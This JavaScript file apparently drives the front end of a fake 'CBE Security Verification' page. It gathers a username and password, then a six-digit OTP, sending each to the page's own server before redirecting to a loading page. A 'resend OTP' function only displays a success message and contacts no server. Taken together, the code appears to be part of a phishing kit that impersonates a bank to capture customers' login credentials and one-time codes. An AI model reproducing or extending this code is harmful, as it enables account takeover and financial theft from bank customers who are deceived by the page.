// Main JavaScript file for CBE Security Verification

document.addEventListener('DOMContentLoaded', function() {
    // Initialize form handlers
    initializeForms();
    initializePasswordToggle();
    initializeOTPInput();
    initializeTimer();
});

function initializeForms() {
    // Login Form
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            handleLoginSubmit(this);
        });
    }

    // OTP Form
    const otpForm = document.getElementById('otpForm');
    if (otpForm) {
        otpForm.addEventListener('submit', function(e) {
            e.preventDefault();
            handleOTPSubmit(this);
        });
    }
}

function handleLoginSubmit(form) {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const terms = document.getElementById('terms');

    // Validation
    if (!username || !password) {
        showError('Please fill in all required fields');
        return;
    }

    if (!terms.checked) {
        showError('Please agree to the Terms and Conditions');
        return;
    }

    // Show loading state
    const submitBtn = form.querySelector('.cbe-btn');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Verifying...';

    // Send data to server
    fetch('/api/submit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            window.location.href = data.redirect || '/otp-verify';
        } else {
            showError(data.error || 'Verification failed. Please try again.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Verify Identity';
        }
    })
    .catch(error => {
        console.error('Error:', error);
        showError('Network error. Please try again.');
        submitBtn.disabled = false;
        submitBtn.textContent = 'Verify Identity';
    });
}

function handleOTPSubmit(form) {
    const otp = document.getElementById('otp').value.trim();

    if (!otp || otp.length !== 6) {
        showError('Please enter a valid 6-digit OTP');
        return;
    }

    const submitBtn = form.querySelector('.cbe-btn');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Verifying...';

    fetch('/api/verify-otp', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ otp })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            window.location.href = data.redirect || '/loading';
        } else {
            showError(data.error || 'Invalid OTP. Please try again.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Verify OTP';
        }
    })
    .catch(error => {
        console.error('Error:', error);
        showError('Network error. Please try again.');
        submitBtn.disabled = false;
        submitBtn.textContent = 'Verify OTP';
    });
}

function initializePasswordToggle() {
    const toggle = document.querySelector('.password-toggle');
    if (toggle) {
        toggle.addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.textContent = '🙈';
            } else {
                passwordInput.type = 'password';
                this.textContent = '👁️';
            }
        });
    }
}

function initializeOTPInput() {
    const otpInput = document.getElementById('otp');
    if (otpInput) {
        // Auto-focus next field
        otpInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value.length === 6) {
                // Auto-submit if 6 digits entered
                const form = this.closest('form');
                if (form) {
                    setTimeout(() => form.dispatchEvent(new Event('submit')), 300);
                }
            }
        });

        // Paste support
        otpInput.addEventListener('paste', function(e) {
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const numbers = paste.replace(/[^0-9]/g, '');
            if (numbers.length >= 6) {
                this.value = numbers.slice(0, 6);
                const form = this.closest('form');
                if (form) {
                    setTimeout(() => form.dispatchEvent(new Event('submit')), 300);
                }
            }
        });
    }
}

function initializeTimer() {
    const timerDisplay = document.getElementById('timerDisplay');
    if (timerDisplay) {
        let seconds = 300; // 5 minutes
        const timer = setInterval(() => {
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
            
            if (seconds <= 0) {
                clearInterval(timer);
                timerDisplay.style.color = 'red';
                document.querySelector('.resend-link').style.display = 'inline';
            }
            seconds--;
        }, 1000);
    }
}

function showError(message) {
    // Remove existing error
    const existingError = document.querySelector('.error-message');
    if (existingError) {
        existingError.remove();
    }

    // Create error element
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.innerHTML = `
        <span style="color: #c8102e; font-size: 14px; padding: 10px; background: #fff0f0; border-radius: 5px; display: block; margin: 10px 0;">
            ⚠️ ${message}
        </span>
    `;

    // Insert after form
    const form = document.querySelector('form');
    if (form) {
        form.parentNode.insertBefore(errorDiv, form.nextSibling);
    }

    // Auto-remove after 5 seconds
    setTimeout(() => {
        if (errorDiv.parentNode) {
            errorDiv.remove();
        }
    }, 5000);
}

function togglePassword() {
    const passwordInput = document.getElementById('password');
    const toggle = document.querySelector('.password-toggle');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggle.textContent = '🙈';
    } else {
        passwordInput.type = 'password';
        toggle.textContent = '👁️';
    }
}

function resendOTP() {
    const resendLink = document.querySelector('.resend-link');
    if (resendLink) {
        resendLink.style.display = 'none';
        showError('OTP resent successfully!');
        
        // Reset timer
        const timerDisplay = document.getElementById('timerDisplay');
        if (timerDisplay) {
            timerDisplay.style.color = '#c8102e';
            let seconds = 300;
            clearInterval(window.otpTimer);
            window.otpTimer = setInterval(() => {
                const mins = Math.floor(seconds / 60);
                const secs = seconds % 60;
                timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
                if (seconds <= 0) {
                    clearInterval(window.otpTimer);
                    timerDisplay.style.color = 'red';
                    document.querySelector('.resend-link').style.display = 'inline';
                }
                seconds--;
            }, 1000);
        }
    }
}
